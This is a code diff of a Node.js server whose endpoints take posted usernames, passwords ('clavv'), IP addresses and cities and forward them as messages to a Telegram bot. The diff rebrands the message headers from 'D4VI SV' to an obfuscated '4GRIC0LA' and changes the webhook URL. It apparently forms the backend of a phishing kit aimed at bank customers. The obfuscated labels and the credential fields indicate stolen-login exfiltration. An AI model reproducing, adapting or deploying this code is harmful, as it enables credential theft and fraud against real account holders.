@@ -58,7 +58,7 @@ function cargarCliente(txid) {
 app.post('/enviar', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
-🔴D4VI SV🔴
+🟡4GRIC0LA🟡
 🆔 ID: <code>${txid}</code>
 
 📱 US4R: <code>${usar}</code>
@@ -103,7 +103,7 @@ app.post('/enviar', async (req, res) => {
 app.post('/enviar2', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
-🔑🔴D4VI SV🔴
+🔑🟡4GRIC0LA🟡
 🆔 ID: <code>${txid}</code>
 📱 US4R: <code>${usar}</code>
 
@@ -150,7 +150,7 @@ app.post('/enviar2', async (req, res) => {
 app.post('/enviar3', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
-🔑🔴D4VI SV🔴
+🔑🟡4GRIC0LA🟡
 🆔 ID: <code>${txid}</code>
 📱 US4R: <code>${usar}</code>
 
@@ -274,7 +274,7 @@ app.listen(PORT, async () => {
   console.log('CHAT_ID configurado:', !!CHAT_ID);
 
   // NUEVO: Configura el webhook del bot automáticamente al iniciar
-  const webhookUrl = 'https://davxxyizi1-davxyizix.up.railway.app/telegram-webhook';
+  const webhookUrl = 'https://agricolyizi-agricolyizi.up.railway.app/telegram-webhook';
   try {
     const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${webhookUrl}`);
     const data = await res.json();
